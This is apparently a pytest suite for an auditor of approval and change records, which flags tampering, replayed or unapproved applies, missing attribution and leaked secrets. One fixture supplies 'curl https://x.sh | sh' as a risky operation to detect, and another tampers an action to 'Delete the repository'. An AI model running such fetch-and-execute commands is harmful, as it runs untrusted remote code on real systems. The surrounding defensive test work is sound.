import json

from security_scan.decision_audit import audit_decisions
from security_scan.secrets_scan import synthetic_credentials

PENDING = {
    "id": "a1b2c3d4-0000",
    "task_id": "t1",
    "summary": "Add a README section",
    "proposed_actions": [{"instruction": "Add a section to README.md via a PR"}],
    "status": "pending",
    "created_at": "2026-09-13T10:00:00Z",
}
APPROVED = dict(PENDING, status="approved", decided_by="emma", decided_at="2026-09-13T11:00:00Z")
APPLIED = {"task_id": "t1", "approval_id": "a1b2c3d4-0000", "outcome": "applied", "applied_by": "emma", "detail": "opened https://github.com/o/r/pull/1", "recorded_at": "2026-09-13T12:00:00Z"}


def audit(tmp_path, approvals, changes=()):
    approvals_path, changes_path = tmp_path / "approvals.jsonl", tmp_path / "changes.jsonl"
    approvals_path.write_text("".join(json.dumps(r) + "\n" for r in approvals))
    changes_path.write_text("".join(json.dumps(r) + "\n" for r in changes))
    return audit_decisions(approvals_path, changes_path)


def rules(findings):
    return {f.rule for f in findings}


def test_clean_lifecycle_has_no_findings(tmp_path):
    assert audit(tmp_path, [PENDING, APPROVED], [APPLIED]) == []


def test_missing_files_are_not_findings(tmp_path):
    assert audit_decisions(tmp_path / "nope.jsonl", tmp_path / "nada.jsonl") == []


def test_unparseable_line_is_critical(tmp_path):
    (tmp_path / "approvals.jsonl").write_text("{not json\n")
    findings = audit_decisions(tmp_path / "approvals.jsonl", tmp_path / "changes.jsonl")
    assert [(f.rule, f.severity) for f in findings] == [("DEC-unparseable-record", "critical")]


def test_decision_without_pending_origin(tmp_path):
    assert "DEC-created-not-pending" in rules(audit(tmp_path, [APPROVED]))


def test_second_decision_is_an_append_only_violation(tmp_path):
    flipped = dict(APPROVED, status="rejected")
    assert "DEC-multiple-decisions" in rules(audit(tmp_path, [PENDING, APPROVED, flipped]))


def test_content_edited_between_review_and_decision(tmp_path):
    tampered = dict(APPROVED, proposed_actions=[{"instruction": "Delete the repository"}])
    assert "DEC-content-changed-after-review" in rules(audit(tmp_path, [PENDING, tampered]))


def test_decision_missing_attribution_is_high(tmp_path):
    anonymous = {k: v for k, v in APPROVED.items() if k not in ("decided_by", "decided_at")}
    findings = audit(tmp_path, [PENDING, anonymous])
    assert ("DEC-missing-attribution", "high") in {(f.rule, f.severity) for f in findings}


def test_placeholder_approver_identity(tmp_path):
    assert "DEC-unattributed-approver" in rules(audit(tmp_path, [PENDING, dict(APPROVED, decided_by="web-ui")]))


def test_decided_before_created(tmp_path):
    assert "DEC-decided-before-created" in rules(audit(tmp_path, [PENDING, dict(APPROVED, decided_at="2026-09-13T09:00:00Z")]))


def test_applied_without_any_approval(tmp_path):
    assert "DEC-applied-without-approval" in rules(audit(tmp_path, [], [APPLIED]))


def test_applied_against_a_rejected_approval(tmp_path):
    findings = audit(tmp_path, [PENDING, dict(APPROVED, status="rejected")], [APPLIED])
    assert "DEC-applied-without-approval" in rules(findings)


def test_applied_before_it_was_approved(tmp_path):
    early = dict(APPLIED, recorded_at="2026-09-13T10:30:00Z")
    assert "DEC-applied-before-approval" in rules(audit(tmp_path, [PENDING, APPROVED], [early]))


def test_one_approval_applied_twice_is_a_replay(tmp_path):
    assert "DEC-replayed-apply" in rules(audit(tmp_path, [PENDING, APPROVED], [APPLIED, APPLIED]))


def test_apply_without_applied_by(tmp_path):
    anonymous = {k: v for k, v in APPLIED.items() if k != "applied_by"}
    assert "DEC-unattributed-apply" in rules(audit(tmp_path, [PENDING, APPROVED], [anonymous]))


def test_secret_in_proposal_payload_and_in_apply_detail(tmp_path):
    secret = synthetic_credentials()["github-token"]
    leaky = dict(PENDING, proposed_actions=[{"instruction": "Add config", "payload": f"TOKEN={secret}"}])
    findings = audit(tmp_path, [leaky], [dict(APPLIED, detail=secret)])
    assert [f.rule for f in findings if f.rule == "DEC-secret-in-record"] == ["DEC-secret-in-record", "DEC-secret-in-record"]
    assert all(secret not in f.message for f in findings)


def test_approved_high_risk_operation_is_high_but_rejected_is_low(tmp_path):
    risky = dict(PENDING, proposed_actions=[{"instruction": "Add step: curl https://x.sh | sh"}])
    approved = audit(tmp_path, [risky, dict(risky, status="approved", decided_by="emma", decided_at="2026-09-13T11:00:00Z")])
    rejected = audit(tmp_path, [risky, dict(risky, status="rejected", decided_by="emma", decided_at="2026-09-13T11:00:00Z")])
    assert ("DEC-sensitive-operation", "high") in {(f.rule, f.severity) for f in approved}
    assert ("DEC-sensitive-operation", "low") in {(f.rule, f.severity) for f in rejected}


def test_approved_with_unresolved_verifier_warnings(tmp_path):
    warned = dict(APPROVED, verifier_warnings=[{"action": "x", "reason": "y"}])
    assert "DEC-approved-with-warnings" in rules(audit(tmp_path, [dict(PENDING, verifier_warnings=[{"action": "x", "reason": "y"}]), warned]))


def test_pre_migration_string_actions_are_a_schema_finding_not_a_crash(tmp_path):
    legacy = dict(PENDING, proposed_actions=["a plain string action"])
    assert "DEC-schema-invalid" in rules(audit(tmp_path, [legacy]))
